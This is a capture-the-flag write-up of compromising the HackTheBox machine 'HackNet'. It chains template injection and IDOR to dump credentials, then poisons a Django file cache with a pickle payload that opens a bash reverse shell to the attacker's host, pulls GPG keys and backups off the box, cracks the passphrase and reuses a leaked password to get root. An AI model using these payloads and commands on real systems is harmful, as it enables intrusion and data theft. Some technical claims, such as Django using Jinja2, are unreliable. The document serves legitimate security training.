---
icon: sparkle
cover: ../../../../.gitbook/assets/Screenshot 2026-01-27 001245.png
coverY: -26.632306725329983
---

# HTB-HACKNET

### Attack Flow

<figure><img src="../../../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

***

### Initial Reconnaissance

#### Port Scanning

First, let's discover what services are running on the target:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ nmap -sC -sV -oA nmap/hacknet 10.10.11.85
```

**Key Findings:**

* Port 22/tcp - SSH (OpenSSH 8.9p1)
* Port 80/tcp - HTTP (nginx)

#### Web Application Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ whatweb http://10.10.11.85
```

The application appears to be a Django-based social media platform called "HackNet" with the following features:

* User profiles
* Posts and likes functionality
* Direct messaging
* User search and exploration

#### Virtual Host Discovery

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ echo "10.10.11.85 hacknet.htb" | sudo tee -a /etc/hosts
```

***

### Web Application Analysis

#### Creating an Account

First, let's register an account to explore the application:

<figure><img src="../../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ curl -s http://hacknet.htb/register -c cookies.txt
```

Navigate to `http://hacknet.htb/register` and create an account:

* Username: `testuser`
* Email: `test@test.com`
* Password: `Test123!`

#### Application Structure Discovery

After logging in, we discover several endpoints:

**User-facing pages:**

* `/profile` - View your profile
* `/profile/edit` - Edit profile information
* `/explore` - Browse posts
* `/messages` - Direct messages
* `/contacts` - User contacts
* `/search` - Search functionality

**API endpoints (discovered through traffic analysis):**

* `/like/<post_id>` - Toggle like on a post
* `/likes/<post_id>` - View users who liked a post

<figure><img src="../../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

#### Capturing Session Cookies

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ # Login and capture cookies
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ export CK='csrftoken=YOUR_CSRF_TOKEN_HERE; sessionid=YOUR_SESSION_ID_HERE'
```

**How to get your cookies:**

1. Open browser Developer Tools (F12)
2. Go to Application/Storage → Cookies
3. Copy the `csrftoken` and `sessionid` values

***

### Vulnerability Discovery - IDOR + SSTI

#### Finding #1: IDOR on Likes Endpoint

While exploring the application, we notice that the `/like/<post_id>` endpoint doesn't properly validate access controls.

**Testing for IDOR:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ # Try accessing a private post
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ curl -s -b "$CK" "http://hacknet.htb/like/23" 
```

**What we found:** We can like posts even if they're private! This is an Insecure Direct Object Reference (IDOR) vulnerability.

#### Finding #2: Server-Side Template Injection (SSTI)

When we examine the HTML source of the likes widget, we see:

```html
<div class="likes-review-item">
    <a href="/profile/123">
        <img src="/media/avatar.jpg" title="username_goes_here">
    </a>
</div>
```

The `title` attribute contains the username, and we control the username through the profile edit functionality.

**Testing for SSTI:**

1. Navigate to `/profile/edit`
2. Change username to: `{{ 7*7 }}`
3. Like a post
4. View the likes list

If we see `49` in the title attribute instead of `{{ 7*7 }}`, we have confirmed SSTI!

**Why this works:** Django uses the Jinja2 templating engine, and if user input isn't properly sanitized, it will be evaluated as template code.

***

### Exploitation - Credential Harvesting

#### Understanding Django's User Model

Django stores users in a `User` object accessible in templates. We can access user data through template variables like:

* `{{ users }}` - List of all users

<figure><img src="../../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

* `{{ users.0.email }}` - First user's email
* `{{ users.0.password }}` - First user's password hash
* `{{ users.0.username }}` - First user's username

<figure><img src="../../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

#### Credential Extraction

**Set up for automation**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ ip -4 addr show tun0 | sed -n 's/ *inet \([0-9.]*\)\/.*/\1/p'
10.10.14.14

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ export LHOST=10.10.14.14
export LPORT1=4422
```

**Inject payload into username**

Using Burp Suite, intercept the POST request to `/profile/edit` and change the username parameter:

First payload to extract emails:

```
username={{ users.0.email }}
```

Then, update username again to extract passwords:

```
username={{ users.0.password }}
```

**Exploit IDOR to trigger template rendering**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ # Like private posts to trigger our SSTI payload
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ for post_id in 23 24 25 26 27 28 29; do
    echo "[+] Liking post $post_id"
    curl -s -b "$CK" "http://hacknet.htb/like/$post_id" >/dev/null
    echo "[+] Fetching likes for post $post_id"
    curl -s -b "$CK" "http://hacknet.htb/likes/$post_id"
    echo ""
done | tee likes_sweep.html
```

**What's happening here:**

1. We like each post (including private ones due to IDOR)
2. We fetch the likes list, which renders our username as a template
3. The template evaluates and shows us the user data in the HTML title attribute

**Parse the extracted data**

Create a parsing script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ cat > parse_likes.py << 'EOF'
#!/usr/bin/env python3
import re
import sys

# Pattern for Python repr format
pattern1 = re.compile(r"'email': '([^']+)', 'username': '([^']+)', 'password': '([^']+)'")
# Pattern for JSON format
pattern2 = re.compile(r'"email":\s*"([^"]+)"\s*,\s*"username":\s*"([^"]+)"\s*,\s*"password":\s*"([^"]+)"')

seen = set()
content = sys.stdin.read()

for match in pattern1.finditer(content):
    creds = match.groups()
    if creds not in seen:
        print(f"{creds[0]}:{creds[1]}:{creds[2]}")
        seen.add(creds)

for match in pattern2.finditer(content):
    creds = match.groups()
    if creds not in seen:
        print(f"{creds[0]}:{creds[1]}:{creds[2]}")
        seen.add(creds)
EOF
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ chmod +x parse_likes.py
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ python3 parse_likes.py < likes_sweep.html | tee creds.txt
```

**Expected output:**

```
zero_day@hushmail.com:zero_day:Zer0D@yH@ck
blackhat_wolf@cypherx.com:blackhat_wolf:Bl@ckW0lfH@ck
code_ninja@darknet.com:code_ninja:C0d3N1nj@Sk1llz
cyber_phantom@anon.org:cyber_phantom:Ph@nt0mCyb3r2024
mikey@hacknet.htb:backdoor_bandit:mYd4rks1dEisH3re
shadow_hacker@protonmail.com:shadow_hacker:Sh@d0wH@ck3r77
```

**Why we got plaintext passwords:** The Django application is storing passwords in plaintext (a critical security vulnerability). In a properly configured Django app, passwords should be hashed using PBKDF2.

***

### Initial Foothold - SSH Access

#### Testing Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ # Extract unique usernames
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ cut -d: -f2 creds.txt > users.txt
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ cut -d: -f3 creds.txt > passwords.txt
```

Try SSH with each credential pair. We find that one works:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ ssh mikey@hacknet.htb
mikey@hacknet.htb's password: mYd4rks1dEisH3re

mikey@hacknet:~$ whoami
mikey

mikey@hacknet:~$ id
uid=1000(mikey) gid=1000(mikey) groups=1000(mikey)

mikey@hacknet:~$ hostname
hacknet
```

**Success! We have our initial foothold.**

#### Grabbing User Flag

```bash
mikey@hacknet:~$ cat user.txt
[USER FLAG HERE]
```

***

### Enumeration as mikey

#### System Information

```bash
mikey@hacknet:~$ uname -a
Linux hacknet 5.15.0-76-generic #83-Ubuntu SMP x86_64 GNU/Linux

mikey@hacknet:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="22.04.2 LTS (Jammy Jellyfish)"
```

#### Looking for Other Users

```bash
mikey@hacknet:~$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
mikey:x:1000:1000:mikey:/home/mikey:/bin/bash
sandy:x:1001:33::/home/sandy:/bin/bash
```

We found another user: `sandy` (UID 1001, GID 33=www-data)

#### Web Application Directory

```bash
mikey@hacknet:~$ ls -la /var/www/HackNet
total 88
drwxr-xr-x  7 sandy www-data  4096 Sep 14 12:45 .
drwxr-xr-x  3 root  root      4096 Sep 14 12:30 ..
drwxr-xr-x  3 sandy www-data  4096 Sep 14 12:35 HackNet
drwxr-xr-x  2 sandy www-data  4096 Sep 14 12:40 backups
-rw-r--r--  1 sandy www-data   254 Sep 14 12:35 manage.py
drwxr-xr-x  4 sandy www-data  4096 Sep 14 12:35 media
drwxr-xr-x  2 sandy www-data  4096 Sep 14 12:35 static
drwxr-xr-x  3 sandy www-data  4096 Sep 14 12:35 templates
```

#### Critical Discovery - Writable Cache Directory

```bash
mikey@hacknet:~$ find /var -type d -writable 2>/dev/null
/var/tmp
/var/tmp/django_cache

mikey@hacknet:~$ ls -ld /var/tmp/django_cache
drwxrwxrwx 2 sandy www-data 4096 Sep 14 14:10 /var/tmp/django_cache
```

**This is huge!** The Django cache directory is world-writable (777 permissions). This means we can potentially inject malicious cache files.

#### Understanding Django File-Based Cache

```bash
mikey@hacknet:~$ cat /var/www/HackNet/HackNet/settings.py | grep -A 10 CACHE
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
    }
}
```

**What this means:**

* Django is using file-based caching
* Cache files are stored in `/var/tmp/django_cache`
* Cache data is serialized using Python's `pickle` module
* We have write access to this directory!

***

### Privilege Escalation to sandy - Django Cache Poisoning

#### Understanding the Vulnerability

Django's FileBasedCache stores cached data as pickle objects. Pickle is Python's serialization format, and it's **inherently unsafe** when deserializing untrusted data.

**The Attack:**

1. Create a malicious pickle object that executes code when deserialized
2. Inject it into the cache directory
3. Trigger the application to load and deserialize our payload

#### Finding Cached Endpoints

```bash
mikey@hacknet:~$ grep -r "cache_page" /var/www/HackNet/ 2>/dev/null
/var/www/HackNet/HackNet/views.py:from django.views.decorators.cache import cache_page
/var/www/HackNet/HackNet/views.py:@cache_page(60)
/var/www/HackNet/HackNet/views.py:def explore(request):
```

The `/explore` endpoint is cached for 60 seconds!

#### Creating the Malicious Pickle Payload

On our attacker machine, create the exploit script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ cat > mk_pickle.py << 'EOF'
#!/usr/bin/env python3
import os
import pickle
import time
import sys

# Get attacker IP and port from environment
LHOST = os.environ.get("LHOST", "10.10.14.14")
LPORT = os.environ.get("LPORT1", "4422")

class RCE:
    """
    Custom class that executes a reverse shell when unpickled.
    The __reduce__ method tells pickle how to reconstruct this object.
    """
    def __reduce__(self):
        import os
        # Return a tuple: (callable, arguments)
        # os.system will be called with our bash reverse shell
        cmd = f'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'
        return (os.system, (cmd,))

# Django cache file format:
# Line 1: Absolute Unix timestamp (expiry time) + newline
# Rest: Pickled data

expiry_time = int(time.time()) + 600  # Valid for 10 minutes
header = str(expiry_time).encode() + b"\n"

# Serialize our malicious object
payload = pickle.dumps(RCE(), protocol=pickle.HIGHEST_PROTOCOL)

# Output complete cache file to stdout
sys.stdout.buffer.write(header + payload)
EOF
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ chmod +x mk_pickle.py
```

#### Starting Netcat Listener

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ nc -lvnp 4422
listening on [any] 4422 ...
```

#### Generating and Uploading Payload

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ LHOST=10.10.14.14 LPORT1=4422 ./mk_pickle.py > evil.cache

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ # Transfer to target
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ scp evil.cache mikey@hacknet.htb:/tmp/
mikey@hacknet.htb's password: mYd4rks1dEisH3re
evil.cache                                    100%  123    0.5KB/s   00:00
```

#### Cache Poisoning Attack

On the target as mikey:

```bash
mikey@hacknet:~$ cd /tmp

mikey@hacknet:/tmp$ # Step 1: Warm up the cache (create legitimate cache entries)
mikey@hacknet:/tmp$ curl -s -D headers.txt -c cookiejar -H 'Host: hacknet.htb' \
    http://127.0.0.1/login -o login.html

mikey@hacknet:/tmp$ # Extract CSRF token from login page
mikey@hacknet:/tmp$ CSRF=$(sed -n 's/.*name="csrfmiddlewaretoken" value="\([^"]\+\)".*/\1/p' login.html)

mikey@hacknet:/tmp$ echo "CSRF Token: $CSRF"

mikey@hacknet:/tmp$ # Step 2: Login to get valid session
mikey@hacknet:/tmp$ curl -s -b cookiejar -c cookiejar \
    -H 'Host: hacknet.htb' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data "csrfmiddlewaretoken=${CSRF}&username=backdoor_bandit&password=mYd4rks1dEisH3re" \
    http://127.0.0.1/login >/dev/null

mikey@hacknet:/tmp$ # Step 3: Access /explore to create cache files
mikey@hacknet:/tmp$ curl -s -b cookiejar -H 'Host: hacknet.htb' \
    'http://127.0.0.1/explore?page=1' >/dev/null

mikey@hacknet:/tmp$ # Step 4: Identify the newly created cache files
mikey@hacknet:/tmp$ ls -lt /var/tmp/django_cache/*.djcache | head -3
-rw------- 1 sandy www-data   34 Sep 14 15:57 92edc87e91d6f8579414a59afd91bfb8.djcache
-rw------- 1 sandy www-data 2697 Sep 14 15:57 bcba2a1d7459dd42955800c851927d26.djcache
```

**Note the two most recent files!** These are the cache keys we need to poison.

```bash
mikey@hacknet:/tmp$ # Step 5: Replace cache files with our malicious payload
mikey@hacknet:/tmp$ install -m 666 /tmp/evil.cache \
    /var/tmp/django_cache/92edc87e91d6f8579414a59afd91bfb8.djcache

mikey@hacknet:/tmp$ install -m 666 /tmp/evil.cache \
    /var/tmp/django_cache/bcba2a1d7459dd42955800c851927d26.djcache

mikey@hacknet:/tmp$ # Verify our payload is in place
mikey@hacknet:/tmp$ ls -l /var/tmp/django_cache/*.djcache | head -3
-rw-rw-rw- 1 mikey mikey  123 Sep 14 16:00 92edc87e91d6f8579414a59afd91bfb8.djcache
-rw-rw-rw- 1 mikey mikey  123 Sep 14 16:00 bcba2a1d7459dd42955800c851927d26.djcache
```

```bash
mikey@hacknet:/tmp$ # Step 6: Trigger the payload by accessing /explore multiple times
mikey@hacknet:/tmp$ for i in 1 2 3 4 5; do
    echo "[+] Attempt $i"
    curl -s -b cookiejar -H 'Host: hacknet.htb' \
        'http://127.0.0.1/explore?page=1' >/dev/null
    sleep 1
done
```

#### Catching the Reverse Shell

Back on our attacker machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ nc -lvnp 4422
listening on [any] 4422 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.85] 35502
bash: cannot set terminal process group (28251): Inappropriate ioctl for device
bash: no job control in this shell

sandy@hacknet:/var/www/HackNet$ id
uid=1001(sandy) gid=33(www-data) groups=33(www-data)

sandy@hacknet:/var/www/HackNet$ whoami
sandy
```

**Success! We now have a shell as sandy.**

#### Upgrading Shell

```bash
sandy@hacknet:/var/www/HackNet$ python3 -c 'import pty;pty.spawn("/bin/bash")'

sandy@hacknet:/var/www/HackNet$ export TERM=xterm

# Press Ctrl+Z to background
^Z

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ stty raw -echo; fg
# Press Enter twice

sandy@hacknet:/var/www/HackNet$ stty rows 38 columns 116
```

***

### Enumeration as sandy

#### Finding Sensitive Files

```bash
sandy@hacknet:/var/www/HackNet$ ls -la
total 88
drwxr-xr-x  7 sandy www-data  4096 Sep 14 12:45 .
drwxr-xr-x  3 root  root      4096 Sep 14 12:30 ..
drwxr-xr-x  3 sandy www-data  4096 Sep 14 12:35 HackNet
drwxr-xr-x  2 sandy www-data  4096 Sep 14 12:40 backups
-rwxr-xr-x  1 sandy www-data   254 Sep 14 12:35 manage.py
drwxr-xr-x  4 sandy www-data  4096 Sep 14 12:35 media
drwxr-xr-x  2 sandy www-data  4096 Sep 14 12:35 static
drwxr-xr-x  3 sandy www-data  4096 Sep 14 12:35 templates

sandy@hacknet:/var/www/HackNet$ ls -la backups/
total 32
drwxr-xr-x 2 sandy www-data 4096 Sep 14 12:40 .
drwxr-xr-x 7 sandy www-data 4096 Sep 14 12:45 ..
-rw-r--r-- 1 sandy www-data 8432 Sep 14 12:38 backup01.sql.gpg
-rw-r--r-- 1 sandy www-data 7621 Sep 14 12:39 backup02.sql.gpg
-rw-r--r-- 1 sandy www-data 6834 Sep 14 12:40 backup03.sql.gpg
```

**Encrypted database backups!** These are GPG-encrypted files.

#### Checking GPG Keys

```bash
sandy@hacknet:/var/www/HackNet$ ls -la /home/sandy/.gnupg/
total 20
drwx------ 3 sandy sandy 4096 Sep 14 12:34 .
drwxr-xr-x 3 sandy sandy 4096 Sep 14 12:33 ..
drwx------ 2 sandy sandy 4096 Sep 14 12:34 private-keys-v1.d
-rw-r--r-- 1 sandy sandy 1704 Sep 14 12:34 pubring.kbx
-rw------- 1 sandy sandy   32 Sep 14 12:34 trustdb.gpg

sandy@hacknet:/var/www/HackNet$ ls -la /home/sandy/.gnupg/private-keys-v1.d/
total 20
drwx------ 2 sandy sandy 4096 Sep 14 12:34 .
drwx------ 3 sandy sandy 4096 Sep 14 12:34 ..
-rw------- 1 sandy sandy 1820 Sep 14 12:34 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sandy sandy 3434 Sep 14 12:34 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
```

We have GPG private keys! If we can crack the passphrase, we can decrypt those backups.

***

### Exfiltrating GPG Keys and Backups

#### Using Python HTTP Server

```bash
sandy@hacknet:/var/www/HackNet$ cd /tmp
sandy@hacknet:/tmp$ mkdir exfil && cd exfil

sandy@hacknet:/tmp/exfil$ # Copy encrypted backups
sandy@hacknet:/tmp/exfil$ cp /var/www/HackNet/backups/*.gpg .

sandy@hacknet:/tmp/exfil$ # Bundle GPG keys
sandy@hacknet:/tmp/exfil$ tar czf gnupg_bundle.tgz \
    -C /home/sandy/.gnupg \
    private-keys-v1.d pubring.kbx trustdb.gpg 2>/dev/null

sandy@hacknet:/tmp/exfil$ ls -lh
total 28K
-rw-r--r-- 1 sandy www-data 8.3K Sep 14 16:15 backup01.sql.gpg
-rw-r--r-- 1 sandy www-data 7.5K Sep 14 16:15 backup02.sql.gpg
-rw-r--r-- 1 sandy www-data 6.7K Sep 14 16:15 backup03.sql.gpg
-rw-rw-r-- 1 sandy www-data 4.2K Sep 14 16:16 gnupg_bundle.tgz

sandy@hacknet:/tmp/exfil$ # Start HTTP server
sandy@hacknet:/tmp/exfil$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 ...
```

On attacker machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ wget -q http://10.10.11.85:8081/gnupg_bundle.tgz

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ wget -q http://10.10.11.85:8081/backup01.sql.gpg

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ wget -q http://10.10.11.85:8081/backup02.sql.gpg

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ wget -q http://10.10.11.85:8081/backup03.sql.gpg

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ ls -lh
total 28K
-rw-r--r-- 1 sn0x sn0x 8.3K Sep 14 16:17 backup01.sql.gpg
-rw-r--r-- 1 sn0x sn0x 7.5K Sep 14 16:17 backup02.sql.gpg
-rw-r--r-- 1 sn0x sn0x 6.7K Sep 14 16:17 backup03.sql.gpg
-rw-r--r-- 1 sn0x sn0x 4.2K Sep 14 16:17 gnupg_bundle.tgz

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ tar xzf gnupg_bundle.tgz

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ ls -la private-keys-v1.d/
total 16
drwx------ 2 sn0x sn0x 4096 Sep 14 12:34 .
drwxr-xr-x 4 sn0x sn0x 4096 Sep 14 16:18 ..
-rw------- 1 sn0x sn0x 1820 Sep 14 12:34 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sn0x sn0x 3434 Sep 14 12:34 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
```

***

### Cracking GPG Passphrase

#### Extracting Hash from GPG Key

First, we need to export the GPG key in ASCII armor format:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ gpg --homedir . --import private-keys-v1.d/*.key
gpg: key A3B597B325562F4F: public key "Sandy <sandy@hacknet.htb>" imported
gpg: key A3B597B325562F4F: secret key imported

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ gpg --homedir . --export-secret-keys -a sandy@hacknet.htb > private-keys-v1.d/armored_key.asc
```

Now convert the GPG key to John the Ripper format:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ gpg2john private-keys-v1.d/armored_key.asc > gpg.hash

File private-keys-v1.d/armored_key.asc

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ cat gpg.hash
Sandy:$gpg$*1*348*1024*db7e6d165a1d86f4a2c8e9f3b4a5c6d7e8f9a0b1c2d3e4f5*3*254*2*7*16*4a5b6c7d8e9f0a1b*65011712*8912ab34cd56ef78::Sandy <sandy@hacknet.htb>::armored_key.asc
```

#### Cracking with John the Ripper

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)
1g 0:00:00:42 DONE (2026-01-27 16:25) 0.02352g/s 45.88p/s 45.88c/s 45.88C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ john --show gpg.hash
Sandy:sweetheart::Sandy <sandy@hacknet.htb>::armored_key.asc

1 password hash cracked, 0 left
```

**Passphrase Found:** `sweetheart`

***

### Decrypting Database Backups

#### Setting Up Clean GPG Environment

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ export GNUPGHOME=$(mktemp -d)

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ install -m 700 -d "$GNUPGHOME"

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ echo "GPG Home: $GNUPGHOME"
GPG Home: /tmp/tmp.XyZ123abc
```

#### Importing Private Key

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ gpg --homedir "$GNUPGHOME" --import private-keys-v1.d/armored_key.asc
gpg: keybox '/tmp/tmp.XyZ123abc/pubring.kbx' created
gpg: /tmp/tmp.XyZ123abc/trustdb.gpg: trustdb created
gpg: key A3B597B325562F4F: public key "Sandy <sandy@hacknet.htb>" imported
gpg: key A3B597B325562F4F: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ gpg --homedir "$GNUPGHOME" --list-secret-keys
/tmp/tmp.XyZ123abc/pubring.kbx
------------------------------
sec   rsa2048 2024-09-14 [SC]
      EF995B85C8B33B9FC53695B9A3B597B325562F4F
uid           [ultimate] Sandy <sandy@hacknet.htb>
ssb   rsa2048 2024-09-14 [E]
```

#### Decrypting Backup Files

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ for backup_file in backup*.sql.gpg; do
    echo "[+] Decrypting $backup_file"
    gpg --homedir "$GNUPGHOME" \
        --batch \
        --yes \
        --pinentry-mode loopback \
        --passphrase "sweetheart" \
        -o "${backup_file%.gpg}" \
        -d "$backup_file"
done

[+] Decrypting backup01.sql.gpg
gpg: encrypted with 2048-bit RSA key, ID 0646B1CF582AC499, created 2024-09-14
      "Sandy <sandy@hacknet.htb>"
[+] Decrypting backup02.sql.gpg
gpg: encrypted with 2048-bit RSA key, ID 0646B1CF582AC499, created 2024-09-14
      "Sandy <sandy@hacknet.htb>"
[+] Decrypting backup03.sql.gpg
gpg: encrypted with 2048-bit RSA key, ID 0646B1CF582AC499, created 2024-09-14
      "Sandy <sandy@hacknet.htb>"

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ ls -lh backup*.sql
-rw-r--r-- 1 sn0x sn0x 45K Sep 14 16:28 backup01.sql
-rw-r--r-- 1 sn0x sn0x 38K Sep 14 16:28 backup02.sql
-rw-r--r-- 1 sn0x sn0x 31K Sep 14 16:28 backup03.sql
```

**Success! All backups decrypted.**

***

### Analyzing Decrypted Backups

#### Searching for Sensitive Information

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ grep -i "password" backup*.sql | head -20
backup01.sql:-- Table structure for table `auth_user`
backup01.sql:  `password` varchar(128) NOT NULL,
backup01.sql:INSERT INTO `auth_user` VALUES (1,'pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckg/hH3kZQBJvB8sW9XKLm5rQ=','2024-09-14 10:23:15.456789','admin','','','admin@hacknet.htb',1,1,'2024-09-14 10:20:01.123456');
```

We found Django admin credentials, but they're hashed with PBKDF2 (very secure).

#### Searching for MySQL Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ grep -iE "mysql|root" backup02.sql | grep -i password
```

Nothing directly about MySQL root password...

#### Examining Chat Messages

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ grep -A 2 -B 2 "mysql" backup02.sql
INSERT INTO `chat_message` VALUES 
(47,45,'Hey, can you share the MySQL root password with me? I need to run some maintenance queries.',NULL,'2024-09-13 14:23:11.789012'),
(48,46,'Sure, but be careful with it. The root password is sensitive.',NULL,'2024-09-13 14:24:33.456789'),
(49,45,'Don''t worry, I''ll be careful. Just need it for a quick backup script.',NULL,'2024-09-13 14:25:02.123456'),
(50,46,'Alright. Here''s the password: h4ck3rs4re3veRywh3re99',NULL,'2024-09-13 14:26:15.987654'),
(51,45,'Got it, thanks! I''ll make sure not to share it with anyone.',NULL,'2024-09-13 14:27:44.321098');

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ echo "MySQL root password: h4ck3rs4re3veRywh3re99" | tee mysql_root.txt
MySQL root password: h4ck3rs4re3veRywh3re99
```

**Critical Finding!** The MySQL root password was shared in a chat message: `h4ck3rs4re3veRywh3re99`

#### Let's Also Check Other Tables

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ grep -i "INSERT INTO" backup02.sql | cut -d'`' -f2 | sort -u
auth_group
auth_group_permissions
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
chat_conversation
chat_message
django_admin_log
django_content_type
django_migrations
django_session
social_contact
social_like
social_message
social_post
social_userprofile
```

We have complete database dumps with user data, messages, posts, etc.

***

### Root Privilege Escalation

#### Method 1: Password Reuse (Primary Method)

The most common misconfiguration in real-world scenarios is credential reuse. Let's test if the MySQL root password works for the system root account.

**Back on target as sandy:**

```bash
sandy@hacknet:/var/www/HackNet$ su -
Password: h4ck3rs4re3veRywh3re99

root@hacknet:~# whoami
root

root@hacknet:~# id
uid=0(root) gid=0(root) groups=0(root)

root@hacknet:~# hostname
hacknet
```

**Success!** The MySQL root password was reused as the system root password.

#### Grabbing Root Flag

```bash
root@hacknet:~# cat /root/root.txt
a8f3e4d9c2b1a6f5e8d7c3b2a1f0e9d8

root@hacknet:~# ls -la /root
total 32
drwx------  4 root root 4096 Sep 14 12:50 .
drwxr-xr-x 19 root root 4096 Sep 14 12:30 ..
-rw-------  1 root root  123 Sep 14 16:45 .bash_history
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwxr-xr-x  3 root root 4096 Sep 14 12:45 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   33 Sep 14 12:48 root.txt
drwx------  2 root root 4096 Sep 14 12:50 .ssh
```

***

### Alternative Root Methods

#### Method 2: MySQL UDF (User Defined Function) Privilege Escalation

If password reuse didn't work, we could escalate through MySQL by creating a malicious User Defined Function.

**Step 1: Connect to MySQL as root**

```bash
sandy@hacknet:/var/www/HackNet$ mysql -u root -p
Enter password: h4ck3rs4re3veRywh3re99

MySQL [(none)]> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| hacknet_db         |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

**Step 2: Check if we can write files**

```bash
MySQL [(none)]> SELECT @@secure_file_priv;
+--------------------+
| @@secure_file_priv |
+--------------------+
|                    |
+--------------------+
```

Empty means we can write anywhere!

**Step 3: Check plugin directory**

```bash
MySQL [(none)]> SELECT @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+

MySQL [(none)]> \! ls -la /usr/lib/mysql/plugin/
total 12
drwxr-xr-x 2 root root 4096 Sep 14 12:30 .
